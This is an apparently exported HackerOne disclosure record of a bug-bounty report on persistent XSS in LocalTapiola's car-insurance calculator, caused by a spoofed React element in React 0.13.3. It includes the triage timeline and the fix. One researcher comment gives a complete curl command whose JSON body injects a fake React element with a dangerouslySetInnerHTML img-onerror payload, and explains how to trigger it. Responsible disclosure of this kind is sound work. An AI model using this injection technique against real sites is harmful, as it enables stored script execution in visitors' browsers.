{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-06-27T22:32:08.376Z", 
    "voters": [
        "fransrosen", 
        "jobert", 
        "michiel", 
        "bogdantcaciuc", 
        "malcolmx", 
        "zephrfish", 
        "axolotl", 
        "lars", 
        "jens", 
        "paulos_", 
        "and 14 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "300.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 139004, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-06-27T22:26:59.450Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Persistent XSS at verkkopalvelu.tapiola.fi using spoofed React element and React v.0.13.3", 
    "is_member_of_team?": null, 
    "vote_count": 24, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 2136, 
            "content": "##Issue\n\nThe reporter found a flaw in the way JSON data was being handled in the car insurance calculator. There was a verified bug in a 3rd party library, namely React, that was vulnerable. The reporter was able to successfully exploit the flaw and create a persistent XSS. \n\n##Fix\nThe React library was patched.\n\n##Reasoning\nThe severity of the bug was classified as medium as the risk for personal data leak was minimal to nonexistent but the result of the vulnerability was persistent. Exploiting in a real-life scenario still required some way of tricking (e.g. phishing) the user into clicking a specific link. ", 
            "content_html": "<h2 id=\"issue\">Issue</h2>\n\n<p>The reporter found a flaw in the way JSON data was being handled in the car insurance calculator. There was a verified bug in a 3rd party library, namely React, that was vulnerable. The reporter was able to successfully exploit the flaw and create a persistent XSS. </p>\n\n<h2 id=\"fix\">Fix</h2>\n\n<p>The React library was patched.</p>\n\n<h2 id=\"reasoning\">Reasoning</h2>\n\n<p>The severity of the bug was classified as medium as the risk for personal data leak was minimal to nonexistent but the result of the vulnerability was persistent. Exploiting in a real-life scenario still required some way of tricking (e.g. phishing) the user into clicking a specific link. </p>\n"
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-07-27T22:26:59.513Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$300", 
    "attachments": [
        {
            "file_name": "Screen_Shot_2016-05-15_at_23.09.13.png", 
            "type": "image/png", 
            "id": 94020, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225225Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3c53e88754ff1a53c6026482a5433130a3c397703b047cf84bff24fcbf0bbeec"
        }, 
        {
            "file_name": "Screen_Shot_2016-05-15_at_23.00.25.png", 
            "type": "image/png", 
            "id": 94022, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225225Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb13adc3f666a2bd68c6de124a5901ad2e1bfa8cd2dd6ad27c2b4f617f30aca9"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-05-16T06:20:48.698Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-16T06:20:48.698Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.", 
            "markdown_message": "<p>Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.</p>\n\n<p>Our security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.</p>\n", 
            "type": "Activities::Comment", 
            "id": 958582, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-23T12:30:43.252Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-23T12:30:43.252Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "A quick update on this one. We have forwarded your finding to the 3rd party responsible for this service and we are awaiting their response. Please have patience while we are investigating.", 
            "markdown_message": "<p>A quick update on this one. We have forwarded your finding to the 3rd party responsible for this service and we are awaiting their response. Please have patience while we are investigating.</p>\n", 
            "type": "Activities::Comment", 
            "id": 969898, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T09:16:32.976Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T09:16:32.976Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Hi @fransrosen . A fix for this report has been issued and injecting malicious content is not possible anymore. There is a low risk injection possibility still in the application. We will not accept any reports on that issue, as it is known and accepted risk. Bounty decisions will be made next Monday and we can have full disclosure at that point. We would appreciate if you can verify the fix from your point of view also.", 
            "markdown_message": "<p>Hi <a href=\"/fransrosen\">@fransrosen</a> . A fix for this report has been issued and injecting malicious content is not possible anymore. There is a low risk injection possibility still in the application. We will not accept any reports on that issue, as it is known and accepted risk. Bounty decisions will be made next Monday and we can have full disclosure at that point. We would appreciate if you can verify the fix from your point of view also.</p>\n", 
            "type": "Activities::Comment", 
            "id": 994538, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T12:44:28.647Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T12:44:28.647Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Hi,\nIs the fix actually deployed? I was able to reproduce the issue again.\n\nPoC-link: https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nI first ran this command:\n```\ncurl -i -s -k  -X 'POST' \\\n    -H 'Content-Type: application/json' \\\n    -b 'caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789' \\\n    --data-binary $'{\\\"79rtwta5z4hjkn3npvu5ak0521\\\":{\\\"postCode\\\":{\\\"isValid\\\":true,\\\"error\\\":{\\\"_store\\\":{},\\\"type\\\":\\\"body\\\",\\\"props\\\":{\\\"dangerouslySetInnerHTML\\\":{\\\"__html\\\":\\\"<img src=x onerror=alert(document.domain)>\\\"}},\\\"_isReactElement\\\":true},\\\"value\\\":\\\"jjj\\\"},\\\"dateOfIntroduction\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"JAJAJA\\\"},\\\"cylinderCapacity\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"yyy\\\"},\\\"manufacturerCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"zzz\\\"},\\\"netPower\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"bbb\\\"},\\\"birthDate\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"11.11.2011xxx\\\"},\\\"grossWeight\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ccc\\\"},\\\"carType\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"x\\\"},\\\"isRentedOrLeased\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"eee\\\"},\\\"registrationPart2\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"fff\\\"},\\\"modelCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ggg\\\"},\\\"registrationPart1\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"hhh\\\"}}}' \\\n    'https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/'\n```\n\nThe ID I got back, I then used in the following link:\n```\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/XXX\n```\nwhere XXX is the ID I got. As I see it, I'm still able to inject the arbitrary elements into the JSON located here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nCheers,\nFrans", 
            "markdown_message": "<p>Hi,<br>\nIs the fix actually deployed? I was able to reproduce the issue again.</p>\n\n<p>PoC-link: <a title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" href=\"/redirect?signature=f6d3f5ad04f6dc20a27b7250917ce900ad011f82&amp;url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2Fbcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>I first ran this command:</p>\n<pre class=\"highlight plaintext\"><code>curl -i -s -k  -X &#39;POST&#39; \\\n    -H &#39;Content-Type: application/json&#39; \\\n    -b &#39;caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789&#39; \\\n    --data-binary $&#39;{\\&quot;79rtwta5z4hjkn3npvu5ak0521\\&quot;:{\\&quot;postCode\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:{\\&quot;_store\\&quot;:{},\\&quot;type\\&quot;:\\&quot;body\\&quot;,\\&quot;props\\&quot;:{\\&quot;dangerouslySetInnerHTML\\&quot;:{\\&quot;__html\\&quot;:\\&quot;&lt;img src=x onerror=alert(document.domain)&gt;\\&quot;}},\\&quot;_isReactElement\\&quot;:true},\\&quot;value\\&quot;:\\&quot;jjj\\&quot;},\\&quot;dateOfIntroduction\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;JAJAJA\\&quot;},\\&quot;cylinderCapacity\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;yyy\\&quot;},\\&quot;manufacturerCode\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;zzz\\&quot;},\\&quot;netPower\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;bbb\\&quot;},\\&quot;birthDate\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;11.11.2011xxx\\&quot;},\\&quot;grossWeight\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;ccc\\&quot;},\\&quot;carType\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;x\\&quot;},\\&quot;isRentedOrLeased\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;eee\\&quot;},\\&quot;registrationPart2\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;fff\\&quot;},\\&quot;modelCode\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;ggg\\&quot;},\\&quot;registrationPart1\\&quot;:{\\&quot;isValid\\&quot;:true,\\&quot;error\\&quot;:\\&quot;\\&quot;,\\&quot;value\\&quot;:\\&quot;hhh\\&quot;}}}&#39; \\\n    &#39;https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/&#39;\n</code></pre>\n<p>The ID I got back, I then used in the following link:</p>\n<pre class=\"highlight plaintext\"><code>https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/XXX\n</code></pre>\n<p>where XXX is the ID I got. As I see it, I&#39;m still able to inject the arbitrary elements into the JSON located here:<br>\n<a title=\"https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" href=\"/redirect?signature=ba69b3dd123ba2dd415ce043dfddcad03bf0e8e7&amp;url=https%3A%2F%2Fverkkopalvelu.lahitapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2Fapi%2Fvehicle%2Flink%2Fcontinue%2Fbcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Cheers,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 994686, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T12:46:31.177Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T12:46:31.177Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Just for clarity, could you post screenshots of your findings?", 
            "markdown_message": "<p>Just for clarity, could you post screenshots of your findings?</p>\n", 
            "type": "Activities::Comment", 
            "id": 994687, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/097/288/488d72443ff3eaf714229ad0f45cb7d5da04e917/Screen_Shot_2016-06-01_at_14.42.25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225225Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=840c7e4e634c76fd33e7dca4f4c844d52c0773192d2e6014ba15afd4b31d5c37", 
                    "type": "image/png", 
                    "id": 97288, 
                    "filename": "Screen_Shot_2016-06-01_at_14.42.25.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/097/289/afe5fcc2c2a4dc7d5b3ba30905b435eb5e8907a0/Screen_Shot_2016-06-01_at_14.47.02.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225225Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7d8aa49bf77f9a224c97e068b3b5ce81dc245ab35cb009c77894599b87c0e685", 
                    "type": "image/png", 
                    "id": 97289, 
                    "filename": "Screen_Shot_2016-06-01_at_14.47.02.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-06-01T12:48:21.777Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T12:48:21.777Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Absolutely!\nI've attached two images, one showing the payload with the extended JSON-elements, used for the attack, the other one showing what happens when I visit:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nRegards,\nFrans\n", 
            "markdown_message": "<p>Absolutely!<br>\nI&#39;ve attached two images, one showing the payload with the extended JSON-elements, used for the attack, the other one showing what happens when I visit:<br>\n<a title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" href=\"/redirect?signature=f6d3f5ad04f6dc20a27b7250917ce900ad011f82&amp;url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2Fbcc6eccd-1b04-4be3-b721-701e5f3e4ea7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 994692, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T12:48:34.483Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T12:48:34.483Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "To be clear - there is still in injection issue, but your should not be able to inject any malicious code and trigger javascript/xss.", 
            "markdown_message": "<p>To be clear - there is still in injection issue, but your should not be able to inject any malicious code and trigger javascript/xss.</p>\n", 
            "type": "Activities::Comment", 
            "id": 994693, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T12:49:10.478Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T12:49:10.478Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Thanks, will send this back to the team.", 
            "markdown_message": "<p>Thanks, will send this back to the team.</p>\n", 
            "type": "Activities::Comment", 
            "id": 994695, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T20:43:44.464Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T20:43:44.464Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Sorry - this was my bad I misread the test results. This fix is NOT deployed to production yet. I will of course keep you up to date when that actually happens.", 
            "markdown_message": "<p>Sorry - this was my bad I misread the test results. This fix is NOT deployed to production yet. I will of course keep you up to date when that actually happens.</p>\n", 
            "type": "Activities::Comment", 
            "id": 995612, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-21T13:37:27.170Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-21T13:37:27.170Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Hi, this could be retested by you - we have now verified the fix. Please do not that the fix is limited in a sense: spoofed content can still be included in a saved form but malicious content is filtered.", 
            "markdown_message": "<p>Hi, this could be retested by you - we have now verified the fix. Please do not that the fix is limited in a sense: spoofed content can still be included in a saved form but malicious content is filtered.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1026464, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-21T19:07:16.470Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-21T19:07:16.470Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Hi,\nI can now confirm this is fixed, I'm not able to inject additional nodes to the JSON, great!\n\nRegards,\nFrans", 
            "markdown_message": "<p>Hi,<br>\nI can now confirm this is fixed, I&#39;m not able to inject additional nodes to the JSON, great!</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::Comment", 
            "id": 1027036, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "created_at": "2016-06-27T22:25:41.396Z", 
            "is_internal": false, 
            "editable": false, 
